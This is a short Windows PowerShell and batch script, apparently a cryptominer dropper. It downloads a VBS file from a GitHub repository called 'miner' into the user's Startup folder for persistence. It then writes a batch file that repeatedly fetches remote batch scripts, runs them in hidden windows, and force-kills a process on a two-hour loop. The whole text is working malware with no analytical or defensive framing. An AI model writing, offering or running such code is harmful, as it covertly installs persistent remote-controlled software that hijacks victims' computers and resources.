powershell curl -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" https://raw.githubusercontent.com/nmshare/miner/main/startup.vbs; 
New-item C:\temp\start.bat;
Set-Content -Path "C:\temp\start.bat" -Value "powershell curl -o C:\temp\scr.bat https://raw.githubusercontent.com/nmshare/miner/main/startup.bat; start-process C:\temp\scr.bat -windowStyle Hidden
:start
del C:\temp\temp.bat
curl -o C:\temp\temp.bat https://raw.githubusercontent.com/nmshare/miner/main/start.bat
powershell start-process C:\temp\temp.bat -windowStyle Hidden
echo "process started successfully"
timeout /t 7200
taskkill /f /im init.exe
goto start
